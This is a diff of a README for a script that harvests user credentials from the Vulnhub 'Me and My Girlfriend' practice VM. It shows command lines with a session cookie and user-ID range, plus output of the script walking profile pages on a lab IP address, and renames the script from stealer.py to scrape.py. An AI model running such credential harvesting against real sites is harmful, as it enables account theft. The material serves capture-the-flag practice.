@@ -9,14 +9,17 @@ A not so robust script for harvesting the credentials of the Me and My Girlfrien
 ## Run scrape.py
 ```
 python3 scrape.py 192.168.56.123 -sessid r4irnlb966u3b7a6sv0iupc1m4 -suid 1 -euid 5
+```
+```
 python3 scrape.py 192.168.56.123:8080 -sessid r4irnlb966u3b7a6sv0iupc1m4 -suid 1 -euid 5
 ```
-**Note:** The first argument to the script should be the address of the VM.
+> **Note:** The first argument to the script should be the address of the VM.
+> 
 
 ## Example
 ```
 ┌──(kali㉿kali)-[~/Desktop/Vulnhub/Me_and_My_Girlfriend]
-└─$ ./stealer.py 192.168.56.121 -sessid r4irnlb966u3b7a6sv0iupc1m4 -suid 1 -euid 7
+└─$ ./scrape.py 192.168.56.121 -sessid r4irnlb966u3b7a6sv0iupc1m4 -suid 1 -euid 7
 [i] Requests:
 http://192.168.56.121/index.php?page=profile&user_id=1 [ SUCC, Status: 200 ]
 http://192.168.56.121/index.php?page=profile&user_id=2 [ SUCC, Status: 200 ]
